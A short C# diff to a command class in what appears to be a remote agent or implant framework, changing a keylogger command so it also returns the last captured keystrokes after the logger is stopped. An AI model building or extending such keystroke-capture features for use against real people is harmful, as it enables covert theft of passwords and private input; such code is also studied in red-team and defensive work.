@@ -52,7 +52,11 @@ namespace Agent.Commands
                 context.AppendResult(this.Service.LoggedKeyStrokes);
             }
             else
+            {
                 context.AppendResult("Key Logger is stopped!");
+                context.AppendResult("Last Capture :");
+                context.AppendResult(this.Service.LoggedKeyStrokes);
+            }
             return;
         }
     }
